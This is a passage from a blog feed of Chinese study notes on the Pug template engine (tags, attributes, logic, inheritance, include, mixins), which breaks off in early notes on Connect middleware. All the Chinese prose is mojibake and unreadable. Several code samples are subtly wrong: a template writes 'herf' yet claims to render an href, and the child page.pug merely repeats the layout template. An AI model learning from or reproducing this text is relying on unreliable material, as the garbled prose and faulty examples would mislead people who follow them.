å¦‚ä½•ç”¨å†…ç½®çš„å…³é”®å­—å¾€ Pug æ¨¡æ¿é‡Œæ·»åŠ é€»è¾‘ å¦‚ä½•ç”¨ç»§æ‰¿ã€å—å’Œmixins ç»„ç»‡æ¨¡æ¿ Pug åŸºç¡€çŸ¥è¯†Pug çš„æ ‡ç­¾å’Œ HTML ä¸€æ ·ï¼Œä½†æ˜¯æŠ›å¼ƒäº†å‰åŽçš„å­—ç¬¦ï¼Œå¹¶ç”¨ç¼©è¿›è¡¨ç¤ºæ ‡ç­¾çš„åµŒå¥—å…³ç³»ã€‚æ ‡ç­¾å¯ä»¥ç”¨ .&lt;classname&gt;å…³è”ä¸€ä¸ªæˆ–è€…æ˜¯å¤šä¸ª CSS ç±»ã€‚æ¯”å¦‚åº”ç”¨äº† content å’Œ sidebar ç±»çš„ div å…ƒç´ è¡¨ç¤ºä¸ºï¼š 1div.content.sidebar åœ¨æ ‡ç­¾ä¸Šæ·»åŠ  #&lt;ID&gt;å¯ä»¥èµ‹äºˆå®ƒ CSS çš„ ID ã€‚æ¯”å¦‚ä¸Šé¢é‚£ä¸ªå†åŠ ä¸Šä¸€ä¸ª ID 1div.content.sidebar#featured_content 1.æŒ‡å®šæ ‡ç­¾çš„å±žæ€§å°†æ ‡ç­¾çš„å±žæ€§æ”¾åœ¨æ‹¬å·ä¸­ï¼Œæ¯ä¸ªå±žæ€§ä¹‹é—´ç”¨æ‹¬å·åˆ†å¼€ï¼Œä¸‹é¢çš„Pug è¡¨ç¤ºä¸€ä¸ª ä¼šåœ¨æ–°çš„æµè§ˆå™¨æ‰“å¼€çš„æ ‡ç­¾ï¼š 1a(href=&apos;http://laibh.top&apos;,target=&apos;_blank&apos;) å› ä¸ºå¸¦å±žæ€§çš„æ ‡ç­¾å¯èƒ½ä¼šå¾ˆé•¿ï¼Œæ‰€ä»¥ Pug åœ¨å¤„ç†è¿™æ ·çš„æ ‡ç­¾çš„æ—¶å€™ä¼šæ¯”è¾ƒçµæ´»ã€‚æ¯”å¦‚ä¸‹é¢çš„è¿™ç§è¡¨ç¤ºè·Ÿé‚£ä¸ªæ•ˆæžœæ˜¯ä¸€æ ·çš„ï¼š 12a(href=&apos;http://laibh.top&apos;,target=&apos;_blank&apos;) ä¹Ÿå¯ä»¥æŒ‡å®šä¸éœ€è¦å€¼çš„å±žæ€§ï¼Œä¸‹é¢çš„è¿™æ®µ Pug å®žä¾‹æ˜¯ä¸€ä¸ª HTML è¡¨å•ï¼Œå…¶ä¸­åŒ…å«ä¸€ä¸ª select å…ƒç´ ï¼Œä¹Ÿæœ‰é¢„å®šçš„ option ï¼š 123456strong Select your favorite food:form select option(value=&apos;Cheese&apos;) Cheese option(value=&apos;Tofu&apos;) TofuSpecifying tag content åœ¨å‰é¢é‚£æ®µä»£ç ä¸­è¿˜æœ‰æ ‡ç­¾å†…å®¹çš„ç¤ºä¾‹ï¼šstrong æ ‡ç­¾åŽé¢çš„ Select your favorite food:ï¼›ç¬¬ä¸€ä¸ª option åŽé¢çš„ Cheeseï¼›ç¬¬äºŒä¸ª option åŽé¢çš„ Tofuã€‚ è¿™æ˜¯ Pug ä¸­æŒ‡å®šæ ‡ç­¾å†…å®¹çš„å¸¸ç”¨æ–¹æ³•ï¼Œä½†ä¸æ˜¯å”¯ä¸€çš„ã€‚å°½ç®¡è¿™ç§é£Žæ ¼åœ¨æŒ‡å®šçš„æ¯”è¾ƒçŸ­çš„å†…å®¹æ—¶å¾ˆå¥½ç”¨ï¼Œä½†å¦‚æžœæ ‡ç­¾çš„å†…å®¹å¾ˆé•¿ï¼Œåˆ™ä¼šå¯¼è‡´ Pug æ¨¡æ¿ä¸­å‡ºçŽ°è¶…é•¿çš„ä»£ç è¡Œã€‚ä¸è¿‡ã€‚å°±æƒ³ä¸‹é¢è¿™ä¸ªä¾‹å­ï¼Œå¯ä»¥ç”¨ | æŒ‡å®šæ ‡ç­¾çš„å†…å®¹ 1234textarea | This is a some default text | that the user should be | provided with. å¦‚æžœ HTML æ ‡ç­¾åªæŽ¥å—æ–‡æœ¬ï¼ˆå³ä¸èƒ½åµŒå…¥ HTML å…ƒç´ ï¼‰ï¼Œæ¯”å¦‚ style ä¼šè®© script ã€‚åˆ™å¯ä»¥åŽ»æŽ‰ | å­—ç¬¦ï¼Œåƒä¸‹é¢è¿™æ ·ï¼š 12345style. h1&#123; font-size: 6em; color: #9d9; &#125; ç”¨è¿™ä¸¤ç§æ–¹æ³•åˆ«åˆ†å¯ä»¥è¡¨ç¤ºé•¿çŸ­ä¸¤ç§å†…å®¹ï¼Œå¯ä»¥è®© Pug æ¨¡æ¿ä¿æŒæœ‰å‘€ï¼ŒPug è¿˜æœ‰ä¸€ç§è¡¨ç¤ºåµŒå¥—å…³ç³»çš„åŠžæ³•ï¼Œå«åšæ‰©å±•ã€‚ 2.ç”¨å—æ‰©å±•æŠŠä»–ç»„ç»‡å¥½Pug ä¸€èˆ¬ç”¨ ç¼©è¿›è¡¨ç¤ºåµŒå¥—ï¼Œä½†æœ‰æ—¶ç¼©è¿›å½¢æˆçš„ç©ºæ ¼å¤ªå¤šäº†ã€‚æ¯”å¦‚ä¸‹é¢çš„è¿™ä¸ªç”¨ç¼©è¿›å®šä¹‰é“¾æŽ¥åˆ—è¡¨çš„ Pug æ¨¡æ¿ï¼š 1234567ul li a(href=&apos;http://nodejs.org/&apos;) Node.js homepage li a(href=&apos;http://npmjs.org/&apos;) NPM homepage li a(href=&apos;http://nodebits.org/&apos;) Nodebits blog å¦‚æžœç”¨ Pug å—æ‰©å±•ï¼Œè¿™ä¸ªä¾‹å­ä¼šæ›´åŠ ç´§å‡‘ã€‚å—æ‰©å±•å¯ä»¥åœ¨æ ‡ç­¾åŽé¢ç”¨å†’å·è¡¨ç¤ºåµŒå¥—ã€‚ä¾‹å¦‚ä¸‹é¢è¿™æ®µä»£ç ï¼š 1234ul li: a a(href=&apos;http://nodejs.org/&apos;) Node.js homepage li: a(href=&apos;http://npmjs.org/&apos;) NPM homepage li: a(href=&apos;http://nodebits.org/&apos;) Nodebits blog 3.å°†æ•°æ®çº³å…¥åˆ° Pug æ¨¡æ¿ä¸­æ•°æ®ä¼ å…¥åˆ° Pug å¼•æ“Žçš„æ–¹å¼è·Ÿ EJS ä¸€æ ·ï¼Œæ¨¡æ¿å…ˆè¢«ç¼–è¯‘æˆå‡½æ•°ï¼Œç„¶åŽå¸¦ç€ä¸Šä¸‹æ–‡è°ƒç”¨å®ƒï¼Œä»¥ä¾¿äºŽæ¸²æŸ“è¾“å‡º HTML ã€‚å¦‚ä¸‹ä¾‹ï¼š 12345const pug = require(&apos;pug&apos;);const template = &apos;strong #&#123;message&#125;&apos;const context = &#123; message: &apos;Hello template&apos; &#125;;const fn = pug.compile(template);console.log(fn(context)); è¿™ä¸ªæ¨¡æ¿ä¸­çš„ #{message}æ˜¯è¦è¢«ä¸Šä¸‹æ–‡å€¼æ›¿æ¢æŽ‰çš„å ä½ç¬¦ã€‚ ä¸Šä¸‹æ–‡å€¼ä¹Ÿå¯ä»¥ä½œä¸ºå±žæ€§çš„å€¼ã€‚è¿™ä¸ªä¾‹å­ä¼šæ¸²æŸ“å‡ºæ¥ 1&lt;a href="http://laibh.top"&gt; &lt;/a&gt; 12345const pug = require(&apos;pug&apos;);const template = &apos;a(herf=url)&apos;const context = &#123; url: &apos;http://laibh.top&apos; &#125;;const fn = pug.compile(template);console.log(fn(context)); Pug æ¨¡æ¿ä¸­çš„é€»è¾‘æŠŠæ•°æ®äº¤ç»™æ¨¡æ¿åŽï¼Œè¿˜éœ€è¦å®šä¹‰å¤„ç†æ•°æ®çš„é€»è¾‘ï¼Œå¯ä»¥ç›´æŽ¥åœ¨æ¨¡æ¿ä¸­åµŒå…¥ JavaScript ä»£ç æ¥å®šä¹‰æ•°æ®å¤„ç†é€»è¾‘ã€‚ä¾‹å¦‚ if ã€for ã€var å£°æ˜Žç­‰ç­‰ã€‚ä¸‹é¢æœ‰ä¸ªä¾‹å­ 123456789101112131415161718h3.contact-header My Contactsif contacts.length each contact in contacts - var fullName = contact.firstName + &apos; &apos; + contact.lastName .contact-box p fullName if contact.isEditable p: a(href=&apos;/edit/+contact.id) Edit Record p case contact.status when &apos;Active&apos; strong User is active in the system when &apos;Inactive&apos; em User is inactive when &apos;Pending&apos; | User has a pending invitation else p You currently do not have any contacts ä¸‹é¢æ¥çœ‹ä¸€ä¸‹ Pug æ¨¡æ¿ä¸­åµŒå…¥ javascript ä»£ç å¦‚ä½•å¤„ç†è¾“å‡º 1.åœ¨Pugæ¨¡æ¿ä¸­ä½¿ç”¨ JavaScript å¸¦æœ‰ -å‰ç¼€çš„ JavaScript ä»£ç çš„è¿”å›žç»“æžœä¸ä¼šå‡ºçŽ°åœ¨æ¸²æŸ“ç»“æžœä¸­ã€‚å¸¦æœ‰ =å‰ç¼€çš„ JavaScript ä»£ç çš„æ‰§è¡Œç»“æžœä¼šå‡ºçŽ°ã€‚ä½†ä¸ºäº†é˜²æ­¢ XSS æ”»å‡»åšäº†è½¬ä¹‰å¤„ç†ã€‚å¦‚æžœ JavaScript ä»£ç ç”Ÿæˆçš„å†…å®¹ä¸åº”è¯¥è½¬ä¹‰ã€‚é‚£ä¹ˆå¯ä»¥ä½¿ç”¨å‰ç¼€ ï¼=. åœ¨ Pug ä¸­ï¼Œæœ‰äº›å¸¸ç”¨çš„ æ¡ä»¶åˆ¤æ–­å’Œå¾ªçŽ¯è¯­å¥å¯ä»¥ä¸å¸¦å‰ç¼€ï¼šif/else/case/when/default/until/eachå’Œunless Pug ä¸­è¿˜å¯ä»¥å®šä¹‰å˜é‡ï¼Œä¸‹é¢ä¸¤ç§èµ‹å€¼æ–¹å¼æ•ˆæžœæ˜¯ä¸€æ ·çš„ï¼š 12-count = 0count = 0 æ²¡æœ‰å‰ç¼€çš„è¯­å¥æ²¡æœ‰è¾“å‡ºã€‚ 2.å¾ªçŽ¯éåŽ†å¯¹è±¡å’Œæ•°ç»„Pug ä¸­çš„ JavaScript å¯ä»¥è®¿é—®ä¸Šä¸‹æ–‡ä¸­çš„å€¼ã€‚åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬ä¼šè¯»å–ä¸€ä¸ª Pug æ¨¡æ¿ï¼Œå¹¶è®©å®ƒæ˜¾ç¤ºä¸€ä¸ªåŒ…å«ä¸¤ä¸ªæ¶ˆæ¯çš„ä¸Šä¸‹æ–‡çš„æ•°ç»„ï¼š 1234567891011const pug = require('pug');const fs = require('fs');const template = fs.readFileSync('./template.pug');const context = &#123; messages: [ 'You have logged in successfully.', 'Welcome back!' ]&#125;;const fn = pug.compile(template);console.log(fn(context)); Pug æ¨¡æ¿çš„å†…å®¹ 123- messages.forEach( message =&gt;&#123; p= message- &#125;) è¿è¡Œä»£ç ï¼š 1node index.js è¾“å‡ºè¿™æ ·çš„ç»“æžœï¼š 1&lt;p&gt;You have logged in successfully.&lt;/p&gt;&lt;p&gt;Welcome back!&lt;/p&gt; Pug ä¸­è¿˜æœ‰ä¸€ç§éž JavaScript å½¢å¼çš„å¾ªçŽ¯ï¼šeach è¯­å¥ã€‚ç”¨ each è¯­å¥å¾ˆå®¹æ˜“å®žçŽ°æ•°ç»„å’Œå¯¹è±¡å±žæ€§çš„å¾ªçŽ¯éåŽ†. 12each message in messages p= message å¯¹è±¡å±žæ€§çš„å¾ªçŽ¯éåŽ†å¯ä»¥ç¨æœ‰ä¸åŒï¼Œä¾‹å¦‚è¿™æ ·ï¼š 1234each value, key in post div strong #&#123;key&#125; p value 3.æ¡ä»¶åŒ–æ¸²æŸ“çš„æ¨¡æ¿ä»£ç æœ‰æ—¶å€™è¦æ ¹æ®æ•°æ®çš„å–å€¼æ¥å†³å®šæ˜¾ç¤ºé‚£äº›æ¨¡æ¿ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªæ¡ä»¶åˆ¤æ–­çš„ä¾‹å­ã€‚å‡ ä¹Žæœ‰ä¸€åŠçš„å¯èƒ½ä¼šè¾“å‡º script æ ‡ç­¾ï¼š 12345-n = Math.round(Math.random() * 1) + 1;-if (n === 1)&#123; script alert(&apos;You win&apos;);- &#125; æ¡ä»¶åˆ¤æ–­åœ¨ Pug ä¸­è¿˜æœ‰ä¸­æ›´ç®€æ´çš„å†™æ³•ï¼š 1234-n = Math.round(Math.random()* 1) + 1 ; if n === 1 script alert(&apos;You win!&apos;); å¦‚æžœæ¡ä»¶åˆ¤æ–­æ˜¯å–åçš„ï¼Œæ¯”å¦‚ if (n!=1)ï¼Œå¯ä»¥ç”¨ Pug çš„ unless å…³é”®å­—ï¼š 1234-n Math.round(Math.random() *1) + 1; unless n === 1 script alert(&apos;You win!&apos;); 4.åœ¨ Pug ä¸­ä½¿ç”¨ case è¯­å¥Pug ä¸­è¿˜æœ‰ç±»ä¼¼ switch çš„ éž JavaScript æ¡ä»¶åˆ¤æ–­ï¼šcase è¯­å¥ã€‚case è¯­å¥å¯ä»¥æ ¹æ®æ¨¡æ¿çš„åœºæ™¯æŒ‡å®šè¾“å‡ºã€‚ åœ¨ä¸‹é¢çš„ä¾‹å­ä¸­ï¼Œæˆ‘ä»¬ç”¨ case è¯­å¥ä»¥ä¸‰ç§ä¸åŒçš„æ–¹å¼æ˜¾ç¤ºåšå®¢çš„æœç´¢ç»“æžœã€‚å¦‚æžœæ²¡æœ‰ç»“æžœï¼Œåˆ™æ˜¾ç¤ºä¸€æ¡æç¤ºæ¶ˆæ¯ã€‚å¦‚æžœæ‰¾åˆ°ä¸€ç¯‡æ–‡ç« ï¼Œåˆ™æ˜¾ç¤ºå®ƒçš„è¯¦ç»†å†…å®¹ã€‚å¦‚æžœå¾ˆå¤šç¯‡åˆ™ç”¨ each è¯­å¥å¾ªçŽ¯éåŽ†æ‰€æœ‰æ–‡ç« ï¼Œæ˜¾ç¤ºå®ƒä»¬çš„æ ‡é¢˜ï¼š 12345678case results.length when 0 p No results found when 1 p= results[0].content default each result in results p= result.title ç»„ç»‡ Pug æ¨¡æ¿æ¨¡æ¿å®šä¹‰å¥½äº†ä¹‹åŽï¼Œè¦çŸ¥é“è¯¥å¦‚ä½•ç»„ç»‡ã€‚è·Ÿç¨‹åºé€»è¾‘ä¸€æ ·ï¼Œä½ è‚¯å®šä¹Ÿä¸æƒ³è®©æ¨¡æ¿æ–‡ä»¶è¿‡å¤§ï¼Œä¸€ä¸ªæ¨¡æ¿åº”è¯¥å¯¹åº”ä¸€ä¸ªæž„ä»¶ï¼šä¸€ä¸ªé¡µé¢ï¼Œä¸€ä¸ªè¾¹æ æˆ–è€…æ˜¯ä¸€ç¯‡åšå®¢æ–‡ç« çš„å†…å®¹ï¼› ä¸‹é¢ä¼šä»‹ç»å‡ ç§æœºåˆ¶ï¼Œè®©å‡ ä¸ªä¸åŒæ¨¡æ¿æ–‡ä»¶ä¸€èµ·æ¸²æŸ“å†…å®¹ï¼š ç”¨æ¨¡æ¿ç»§æ‰¿ç»„ç»‡å¤šä¸ªæ¨¡æ¿æ–‡ä»¶ ç”¨å—å‰ç¼€/è¿½åŠ å®žçŽ°å¸ƒå±€ æ¨¡æ¿åŒ…å« å€ŸåŠ© mixins é‡ç”¨æ¨¡æ¿é€»è¾‘ 1.ç”¨æ¨¡æ¿ç»§æ‰¿ç»„ç»‡å¤šä¸ªæ¨¡æ¿æ–‡ä»¶æ¨¡æ¿ç»§æ‰¿æ˜¯å¤šä¸ªæ¨¡æ¿æ–‡ä»¶çš„ç»“æž„åŒ–å¤„ç†æ–¹æ³•ä¹‹ä¸€ã€‚ä»Žæ¦‚å¿µä¸Šè®²ï¼Œæ¨¡æ¿å°±åƒé¢å‘å¯¹è±¡ç¼–ç¨‹ä¸­çš„ç±»ã€‚ä¸€ä¸ªæ¨¡æ¿å¯ä»¥æœ‰æ‰©å±•å¦ä¸€ä¸ªï¼Œç„¶åŽè¿™ä¸ªå†æ‰©å±•å¦ä¸€ä¸ªï¼Œåªè¦åˆç†ï¼Œä½¿ç”¨å¤šå°‘å±‚éƒ½å¯ä»¥ã€‚ ä¸‹é¢æœ‰ä¸ªä¾‹å­ï¼Œç”¨æ¨¡æ¿ç»§æ‰¿æä¾›ä¸€ä¸ªç®€å•çš„ HTML åŒ…è£…å™¨ï¼Œå¯ä»¥ç”¨æ¥åŒ…è£… é¡µé¢å†…å®¹ã€‚åˆ›å»ºå­˜æ”¾ Pugæ–‡ä»¶çš„ templatesç›®å½•ã€‚åœ¨å…¶ä¸­åˆ›å»ºæ¨¡æ¿æ–‡ä»¶ layout.pug 12345html head block title body block content layout.pug ä¸­æœ‰ HTML é¡µé¢çš„åŸºæœ¬å®šä¹‰å’Œä¸¤ä¸ªæ¨¡æ¿å—ã€‚æ¨¡æ¿å—å¯ä»¥ç”±åŽè£”æ¨¡æ¿æä¾›å†…å®¹çš„å ä½ç¬¦ã€‚layout.pug çš„åŽè£”æ¨¡æ¿å¯ä»¥åœ¨ title æ¨¡æ¿å—çš„ä½ç½®è®¾ç½®é¡µé¢æ ‡é¢˜ï¼Œåœ¨ content æ¨¡æ¿å—çš„ä½ç½®è®¾å®šé¡µé¢çš„å†…å®¹è¦æ˜¾ç¤ºä»€ä¹ˆã€‚ æŽ¥ä¸‹æ¥åˆ›å»º page.pugã€‚è¿™ä¸ªæ¨¡æ¿ä¼šæä¾› title å’Œ content å—çš„å…·ä½“å†…å®¹ï¼š 12345html head block title body block content ç»§æ‰¿çš„å®žé™…ç”¨æ³•ï¼š 123456789101112131415const pug = require('pug');const fs = require('fs');const templateFile = './templates/page.pug'const iterTemplate = fs.readFileSync(templateFile);const context = &#123; messages: [ 'You have logged in successfully.', 'Welcome back!' ]&#125;const iterFn = pug.compile( iterTemplate, &#123; filename: templateFile &#125;)console.log(iterFn(context)); 2.ç”¨å—å‰ç¼€/å—è¿½åŠ å®žçŽ°å¸ƒå±€åœ¨å‰é¢é‚£ä¸ªä¾‹å­ä¸­ï¼Œlayout.pug ä¸­çš„æ¨¡æ¿æ²¡æœ‰å†…å®¹ï¼Œå› æ­¤åœ¨ page.pug æ¨¡æ¿ä¸­è®¾å®šå†…å®¹ç®€ç­”ç›´æŽ¥ã€‚å¦‚æžœè¢«ç»§æ‰¿çš„æ¨¡æ¿ä¸­æ²¡æœ‰å†…å®¹ï¼Œä¹Ÿå¯ä»¥ç”¨å—å‰ç¼€å’Œå—è¿½åŠ ï¼Œåœ¨åŽŸæœ‰å†…å®¹åŸºç¡€ä¸Šæž„å»ºæ–°å†…å®¹è€Œä¸æ˜¯æ›¿æ¢å®ƒã€‚ ä¸‹é¢çš„ layout.pug æ¨¡æ¿ä¸­åŠ äº†ä¸€ä¸ªæ¨¡æ¿å— scripts ï¼Œå…¶ä¸­æœ‰åŠ è½½ jq çš„ script æ ‡ç­¾ 12345678html head - const baseUrl = &quot;http://ajax.googleapis.com/ajax/libs/jqueryui/1.8/&quot; block title block style block scripts body block content 1234567891011121314151617181920212223extends layout.pugblock title title Messagesblock style link(rel=&quot;stylesheet&quot;, href=baseUrl+&quot;themes/flick/jquery-ui.css&quot;)block scripts script(src=baseUrl+&quot;jquery-ui.js&quot;)block content - count = 0 each message in messages - count = count + 1 script. $(() =&gt; &#123; $(&quot;#message_#&#123;count&#125;&quot;).dialog(&#123; height: 140, modal: true &#125;); &#125;); != &apos;&lt;div id=&quot;message_&apos; + count + &apos;&quot;&gt;&apos; + message + &apos;&lt;/div&gt;&apos; ä½†æ¨¡æ¿ç»§æ‰¿ä¸æ˜¯å”¯ä¸€ä¸€ç§é›†æˆå¤šä¸ªæ¨¡æ¿çš„åŠžæ³•ï¼Œè¿˜å¯ä»¥ä½¿ç”¨ include Pug å‘½ä»¤ã€‚ 3.æ¨¡æ¿åŒ…å«Pug ä¸­çš„ include å‘½ä»¤å¼å¦ä¸€ä¸ªç»„ç»‡æ¨¡æ¿çš„å·¥å…·ã€‚è¿™ä¸ªå‘½ä»¤ä¼šå¼•å…¥å¦ä¸€ä¸ªæ¨¡æ¿ä¸­å†…å®¹ã€‚ å¦‚æžœåœ¨å‰é¢é‚£ä¸ª layout.pug ä¸­åŠ å…¥ä¸€ä¸ª include footer å°±ä¼šå¼•å…¥è¿™ä¸ªæ¨¡æ¿ 123456789html head - const baseUrl = &quot;http://ajax.googleapis.com/ajax/libs/jqueryui/1.8/&quot; block title block style block scripts body block content include footer å¯ä»¥ ç”¨ include å¾€ layout.pug ä¸­æ·»åŠ å…³äºŽç½‘ç«™çš„æ¶ˆæ¯æˆ–è®¾è®¡å…ƒç´ ã€‚ä¹Ÿå¯ä»¥æŒ‡å®šæ–‡ä»¶çš„æ‰©å±•åï¼ŒåŒ…å« éž Pug æ–‡ä»¶ï¼ˆæ¯”å¦‚ include xxx.htmlï¼‰ 4.å€ŸåŠ© mixin é‡ç”¨æ¨¡æ¿é€»è¾‘å°½ç®¡ Pug çš„ include å‘½ä»¤èƒ½å¸®æˆ‘ä»¬å¼•å…¥ä¹‹å‰åˆ›å»ºçš„ ä»£ç å—ï¼Œä½†è¦æž„å»ºåœ¨ç¨‹åºå’Œä¸åŒé¡µé¢ä¹‹é—´å…±äº«çš„å¯é‡ç”¨åŠŸèƒ½åº“æ—¶ï¼Œå®ƒå°±å¸®ä¸ä¸Šå¿™äº†ã€‚Pug ä¸ºæ­¤ä¸“é—¨æä¾›äº† mixin å‘½ä»¤ï¼Œå¯ä»¥ç”¨æ¥å®šåˆ¶å¯é‡ç”¨çš„ Pug ä»£ç å—ã€‚ mixin æ¨¡æ‹Ÿçš„æ˜¯ JavaScript å‡½æ•°ã€‚å®ƒè·Ÿå‡½æ•°ä¸€æ ·ï¼Œå¯ä»¥å¸¦å‚æ•°ï¼Œå¹¶ä¸”è¿™äº›å‚æ•°å¯ä»¥ç”¨æ¥ç”Ÿæˆ Pug ä»£ç ã€‚ æ¯”å¦‚è¯´è¦å¤„ç†ä¸‹é¢è¿™ç§æ•°æ®ç»“æž„ï¼š 12345const students = [ &#123; name: 'Rick LaRue', age: 23 &#125;, &#123; name: 'Sarah Cathands', age: 25 &#125;, &#123; name: 'Bob Dobbs', age: 37 &#125; ] å¦‚æžœè¦æŠŠå¯¹è±¡ä¸­æå–å‡ºæ¥çš„å±žæ€§è¾“å‡ºåˆ° HTML åˆ—è¡¨ä¸­ï¼Œé‚£ä¹ˆå¯ä»¥åƒä¸‹é¢è¿™æ ·å®šä¹‰ä¸€ä¸ª mixin: 1234mixin list_object_property(objects, property) ul each object in objects li = object[property] ç„¶åŽå°±å¯ä»¥åƒä¸‹é¢è¿™æ ·å€ŸåŠ© mixinæ˜¾ç¤ºè¿™äº›æ•°æ®äº† 1mixin list_object_property(students,'name'); å€ŸåŠ©æ¨¡æ¿ç»§æ‰¿ã€include è¯­å¥å’Œ mixinï¼Œä½ å¯ä»¥è½»æ¾åœ°é‡ç”¨å±•ç¤ºæ ‡è®°ï¼Œé˜²æ­¢æ¨¡æ¿æ–‡ä»¶å˜å¾—è¿‡äºŽå†—é•¿ æ€»ç»“ æ¨¡æ¿å¼•æ“Žå¯ä»¥æŠŠç¨‹åºé€»è¾‘å’Œå±•ç¤ºç»„ç»‡å¥½ EJSã€Hogan.js å’Œ Pug éƒ½æ˜¯ Node ä¸­æ¯”è¾ƒæµè¡Œçš„æ¨¡æ¿å¼•æ“Žã€‚ EJS æ”¯æŒç®€å•çš„æµç¨‹æŽ§åˆ¶ï¼Œä»¥åŠè½¬ä¹‰æˆ–éžè½¬ä¹‰æ’å€¼ã€‚ Hogan.js æ˜¯ç®€å•çš„æ¨¡æ¿å¼•æ“Žï¼Œä¸æ”¯æŒæµç¨‹æŽ§åˆ¶ï¼Œä½†æ”¯æŒ Mustache æ ‡å‡† Pug æ˜¯æ¯”è¾ƒå¤æ‚çš„æ¨¡æ¿è¯­è¨€ï¼Œå¯ä»¥è¾“å‡º HTMLï¼Œä½†ä¸ç”¨å°–æ‹¬å·ã€‚ Pug ç”¨ç©ºæ ¼è¡¨ç¤ºæ ‡ç­¾çš„åµŒå¥—å…³ç³»]]></content>
      <categories>
        <category>Nodejs</category>
      </categories>
      <tags>
        <tag>Nodejs</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Nodejså®žæˆ˜ â€”â€” æ·±å…¥äº†è§£Connect å’Œ Express]]></title>
    <url>%2F2018-12-08-NodeJs2-Part6.html</url>
    <content type="text"><![CDATA[è¯» ã€Šnode.jså®žæˆ˜2.0ã€‹ï¼Œè¿›è¡Œå­¦ä¹ è®°å½•æ€»ç»“ã€‚ å½“å½“ç½‘è´­ä¹°é“¾æŽ¥ è±†ç“£ç½‘1.0é“¾æŽ¥ æ·±å…¥äº†è§£Connect å’Œ Expressæœ¬ç« å†…å®¹ äº†è§£ Connect å’Œ Express æ˜¯ç”¨æ¥åšä»€ä¹ˆçš„ ä¸­é—´ä»¶çš„ä½¿ç”¨å’Œåˆ›å»º Express ç¨‹åºçš„åˆ›å»ºå’Œé…ç½® ç”¨ Express ä¸­çš„å…³é”®å³ä½¿å¤„ç†é”™è¯¯ã€æ¸²æŸ“è§†å›¾å’Œè¡¨å• ç”¨ Express çš„ æž¶æž„æŠ€æœ¯å®žçŽ°è·¯ç”±ã€REST API å’Œç”¨æˆ·è®¤è¯ Connectåˆ›å»º Connect ç¨‹åºConnect ä»¥å‰æ˜¯ Express çš„åŸºç¡€ï¼Œä½†å®žé™…ä¸Šåªç”¨ Connect ä¹Ÿèƒ½åšå‡ºå®Œæ•´çš„ Web ç¨‹åºã€‚å®‰è£…ï¼š 1npm i connect æœ€ç®€å•çš„ Connect ç¨‹åºï¼š 12345const app = require('connect')();app.use((req,res,next) =&gt;&#123; res.end('Hello, world!');&#125;);app.listen(3000); è¿è¡Œï¼š 1node server.js æ‰“å¼€ http://localhost:3000 å¯ä»¥çœ‹åˆ°ç½‘é¡µã€‚ äº†è§£ Connect ä¸­é—´ä»¶çš„å·¥ä½œæœºåˆ¶Connect ä¸­é—´ä»¶æ˜¯ JavaScript å‡½æ•°ï¼Œè¿™ä¸ªå‡½æ•°ä¸€èˆ¬ä¼šæœ‰ä¸‰ä¸ªå‚æ•°ï¼šè¯·æ±‚å¯¹è±¡ã€å“åº”å¯¹è±¡ä»¥åŠä¸€ä¸ªåä¸º next çš„å›žè°ƒå‡½æ•°ã€‚ä¸€ä¸ªä¸­é—´ä»¶å®Œæˆè‡ªå·±çš„å·¥ä½œï¼Œè¦æ‰§è¡ŒåŽç»­çš„ä¸­é—´ä»¶ï¼Œå¯ä»¥è°ƒç”¨è¿™ä¸ªå›žè°ƒå‡½æ•°ã€‚ ä¸­é—´ä»¶è¿è¡Œä¹‹å‰ï¼ŒConnect ä¼šç”¨åˆ†æ´¾å™¨æŽ¥ç®¡è¯·æ±‚å¯¹è±¡ï¼Œç„¶åŽäº¤ç»™ç¨‹åºä¸­çš„ç¬¬ä¸€ä¸ªä¸­é—´ä»¶ã€‚ä¸‹å›¾æ˜¯ å…¸åž‹çš„Connect ç¨‹åºçš„ç¤ºæ„å›¾ï¼Œç”±åˆ†æ´¾å™¨å’Œä¸€ç»„ä¸­é—´ä»¶ç»„æˆï¼Œè¿™äº›ä¸­é—´ä»¶åŒ…æ‹¬æ—¥å¿—è®°å½•ã€æ¶ˆæ¯ä½“è§£æžå™¨ã€é™æ€æ–‡ä»¶æœåŠ¡å™¨å’Œå®šåˆ¶ä¸­é—´ä»¶ã€‚ ç”±æ­¤å¯è§ï¼Œå€ŸåŠ©ä¸­é—´ä»¶ API ï¼Œå¯ä»¥æŠŠä¸€äº›å°çš„æž„ä»¶å—ç»„åˆåœ¨ä¸€èµ·ï¼Œå®žçŽ°å¤æ‚çš„å¤„ç†é€»è¾‘ã€‚ ç»„åˆä¸­é—´ä»¶Connect ä¸­çš„ use æ–¹æ³•å°±æ˜¯ç”¨æ¥ç»„åˆä¸­é—´ä»¶çš„ã€‚æˆ‘ä»¬æ¥å®šä¹‰ä¸¤ä¸ªä¸­é—´ä»¶å‡½æ•°ï¼Œç„¶åŽæŠŠå®ƒä»¬éƒ½æ·»åŠ åˆ°ç¨‹åºä¸­ï¼Œå…¶ä¸­ä¸€ä¸ªæ˜¯ä¹‹å‰çš„é‚£ä¸ªä¾‹å­é‡Œçš„ hello å‡½æ•°ï¼Œå¦å¤–ä¸€ä¸ªæ˜¯ logger. 1234567891011121314const connect = require('connect');function logger(req,res,next)&#123; console.log('%s %s',req.method,req.url); next();&#125;function hello(req,res)&#123; res.setHeader('Content-Type','text/plain'); res.end('Hello world');&#125;connect().use(logger).use(hello).listen(3000); è¿™ä¸¤ä¸ªä¸­é—´ä»¶çš„åç§°ç­¾åä¸ä¸€æ ·ï¼šä¸€ä¸ªæœ‰ next ,ä¸€ä¸ªæ²¡æœ‰ï¼Œå› ä¸ºåŽé¢è¿™ä¸ªä¸­é—´ä»¶å®Œæˆäº† HTTP å“åº”ï¼Œå†ä¹Ÿä¸éœ€è¦æŠŠæŽ§åˆ¶æƒäº¤ç»™åˆ†æ´¾å™¨äº†ã€‚ use() å‡½æ•°è¿”å›žçš„æ˜¯ Connect ç¨‹åºçš„å®žä¾‹ï¼Œæ”¯æŒæ–¹æ³•é“¾ï¼Œä¸è¿‡å¹¶ä¸ä¸€å®šè¦æŠŠ .use() é“¾èµ·æ¥ï¼Œåƒä¸‹é¢è¿™æ ·ä¹Ÿå¯ä»¥ï¼š 1234const app = connect();app.use(logger);app.use(hello);app.listen(3000); ä¸­é—´ä»¶çš„é¡ºåºä¸­é—´ä»¶çš„é¡ºåºä¼šå¯¹ç¨‹åºçš„è¡Œä¸ºäº§ç”Ÿæ˜¾è‘—å½±å“ï¼Œæ¼æŽ‰ next() 